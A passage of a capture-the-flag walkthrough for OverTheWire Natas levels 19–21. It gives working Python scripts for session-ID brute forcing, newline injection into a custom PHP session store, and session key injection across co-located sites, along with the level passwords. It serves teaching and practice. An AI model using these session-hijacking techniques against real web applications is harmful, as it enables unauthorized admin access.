@@ -995,3 +995,356 @@ Quite straightforward, we have a `sess.post()` to let the server give a `PHPSESS
 Simple `GET` like `.../index.php?PHPSESSID=119` don't work. I guess because the cookies are not modified.
 
 Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+# Level 19
+
+URL: http://natas19.natas.labs.overthewire.org/
+
+This level is similar to the last level, except for the fact that the IDs are not sequential. 
+
+We analyse the way IDs are given:
+
+```py
+def analyse_PHPSESSID_generation_procedure():
+    auth_username = 'natas19'
+    auth_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
+    _payload = {'username':'admin', 'password':'admin'}
+
+    for _ in range(1):
+        response = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
+        for cookie in response.cookies:
+            print(cookie.value)
+```
+
+With a few tweaks to the `_payload`, the following facts are observed:
+
+1. The ID is formed of two parts.
+
+2. Suffix is hex coding of the username
+
+3. The prefix takes a number from 1 to 461 and inserts 3 before each character. For 114, 313134
+
+Since we are interested in logging as the admin, `2d61646d696e` becomes the suffix. Now brute force the prefix part.
+
+```py
+def brute_force_PHPSESSID():
+
+    sess = requests.Session()
+    auth_username = 'natas19'
+    auth_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
+    _payload = {'username':'admin', 'password':'admin'}
+
+    response = sess.post('http://natas19.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)    
+
+    for i in range(1, 461):
+        length = len(str(i))
+        string_i = str(i)
+        prefix = ""
+        for i in range(length):
+            prefix = prefix + "3" + string_i[i]
+            
+        cookie_value = prefix + "2d61646d696e"
+        new_cookie = RequestsCookieJar()
+        new_cookie.set(name="PHPSESSID", value=cookie_value, domain='natas19.natas.labs.overthewire.org', path="/")
+        sess.cookies.update(new_cookie)
+        
+        response = sess.get('http://natas19.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
+        try:
+            response.text.index("are logged in as a regular")
+            print(prefix + " 2d61646d696e" + " non admin account: regular user")
+        except:
+            try:
+                response.text.index("Uninitialized string offset:")
+                print(prefix + " 2d61646d696e" + " uninitialized")
+            except:
+                try:
+                    response.text.index("login with your admin account to retrieve credentials for")
+                    print(prefix + " 2d61646d696e" + " non admin account: homepage")
+                except:
+                    print(prefix + " 2d61646d696e" + " admin account ")
+                    print(response.text)
+                    break
+```
+
+The strings `non admin account: homepage` and `uninitialized` are from trial and error. Some IDs (like two digit IDs without any 3) give a `Uninitialized string offset:` while others give the normal homepage as `login with your admin account to retrieve credentials for`.
+
+Finally, the password eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF comes out on 323831-2d61646d696e.
+
+# Level 20
+
+## Vulnerable PHP variable connected to form input without escaping/parsing 
+
+URL: http://natas20.natas.labs.overthewire.org/
+
+[`session_set_save_handler()`](http://www.hackingwithphp.com/10/3/7/files-vs-databases)
+
+1. `session_set_save_handler()` has custom functionality for storing data.
+
+2. The name sent as the input form gets stored into the `$_SESSION["name"]`.
+
+3. The variable `$name` gets set to the value of the session variable `$_SESSION["name"]`.
+
+Open the link and type in a few usernames and press submit. Then open `http://natas20.natas.labs.overthewire.org/index.php?debug` to see the debug output.
+
+4. `session_save_path()` (which returns the current working directory to store session data) returns `/var/lib/php5/sessions/`. The final filename is formed by appending `/mysess_$sid`. `$sid` is a kind of session ID to be targeted
+
+The following function 
+
+```php
+function myread($sid) { 
+    debug("MYREAD $sid"); 
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+} 
+```
+
+ensures:
+
+1. `$sid` is alphanumeric.
+
+2. Reads from the file, and [serializes](https://www.geeksforgeeks.org/serialize-deserialize-array-string/) the data.
+
+The other function
+
+```php
+function mywrite($sid, $data) { 
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data"); 
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+} 
+```
+
+1. converts the serialized data to a dictionary
+
+2. Sets the file permissions to [`0600`](https://chmodcommand.com/chmod-0600/). `600` in octal when converted to binary gives `110 000 000` with each triplet of the form `(read, write, execute)` and the triplets in the order `(owner, group, others)`. Thus, only the owner may read and write to this file.
+
+A few tests reveal some extra facts:
+
+1. At the beginning of the session, a PHPSESSID is alloted. A file name is created and contents of the form are written to the form.
+
+2. There is no escaping and parsing to the user data in the form.
+
+3. Reading from the file is of the form `READ [name admin]` implying file stores contents separated by a space.
+
+The exploit-
+
+```python
+def exploit():
+
+    sess = requests.Session()
+
+    auth_username = 'natas20'
+    auth_password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF' 
+    _payload = {'name' : 'admin\nadmin 1'}
+    response = sess.post('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
+    dissect_response(response) 
+
+    response = sess.get('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
+    dissect_response(response) 
+```
+
+This causes a new line to be written to the file. The second `GET` causes the `myread` function to read from this file and store in the `SESSION` variable the key-value pairs. Hence we get `admin => 1` and thus the password. 
+
+
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+# Level 21
+
+## PHP session hijacking in colocated websites
+
+URL: http://natas21.natas.labs.overthewire.org
+
+This is collocated with http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug.
+
+Contents of original website
+
+```php
+<?
+
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas22\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
+    }
+}
+/* }}} */
+
+session_start();
+print_credentials();
+
+?> 
+```
+
+Nothing much to work with except the `admin = 1` stuff.
+
+The source of the second website is:
+
+```php
+session_start();
+
+// if update was submitted, store it
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+
+if(array_key_exists("debug", $_GET)) {
+    print "[DEBUG] Session contents:<br>";
+    print_r($_SESSION);
+}
+
+// only allow these keys
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
+$form = "";
+
+$form .= '<form action="index.php" method="POST">';
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+}
+$form .= '<input type="submit" name="submit" value="Update" />';
+$form .= '</form>';
+
+$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
+$example = "<div style='$style'>Hello world!</div>";
+
+?>
+
+<p>Example:</p>
+<?=$example?>
+
+<p>Change example values here:</p>
+<?=$form?> 
+```
+
+The following workflow:
+
+1. Form is embedded in PHP this time. 
+
+2. Form has one input `name=submit, value=Update`. When this happens, the `$_REQUEST` parameters are taken and stored in the session as key-value pairs.
+
+3. Some testing and code reading shows other code isn't of much interest.
+
+We need to inject a new key-value pair `admin=1` into the session, and then colocate to `http://natas21.natas.labs.overthewire.org` with the same session.
+
+```python
+def exploit():
+
+    sess = requests.Session()
+
+    auth_username = 'natas21'
+    auth_password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ' 
+    _payload = {'align' : 'left', 'fontsize': '100%', 'bgcolor' : 'red', 'admin':'1', 'submit':'Update'}
+    
+    response = sess.get('http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
+    # dissect_response(response) 
+    
+    response = sess.post('http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
+    # dissect_response(response) 
+
+    for cookie in sess.cookies:
+        val = cookie.value
+
+    response = sess.get('http://natas21.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
+    # dissect_response(response) 
+
+    for cookie in sess.cookies:
+        if(cookie.domain == "natas21.natas.labs.overthewire.org"):
+            cookie.value = val
+
+    response = sess.get('http://natas21.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
+    dissect_response(response) 
+```
+
+The `_payload` has several things, note `"submit": "Update"` is the key. If it is not so, the session value doesn't change. To note this, simply perform `POST` to `...?debug` and observe the session values being printed. Omitting the above key-value pair prints defaults, including them prints dictionary of your choice.
+
+In the above exploit, the first `POST` gives up a `PHPSESSID` in form of a cookie. The session contents are also modified and displayed if `POST` to `...?debug` was made.
+
+```s
+[DEBUG] Session contents:<br>Array
+(
+    [align] => left
+    [fontsize] => 100%
+    [bgcolor] => red
+    [debug] => 
+    [admin] => 1
+    [submit] => Update
+)
+```
+
+Now we perform a `GET` to the main URL, get a new `PHPSESSID` (as is the case when a new session starts), replace that with the `PHPSESSID` of experimenter, and then perform a `GET` again. There's the password.
+
+#### Why are we able to include a new key value pair (admin => 1)?
+
+Because of the way `$_REQUEST` values are written into the session.
+
+```php
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+} 
+```
+
+The foreach loop reads everything into the session. The invalid keys are discarded later on in- 
+
+```php
+// only allow these keys
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
+$form = "";
+
+$form .= '<form action="index.php" method="POST">';
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+} 
+```
+
+but the values are already included in the session by then. Thus, the exploit works. 
+
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
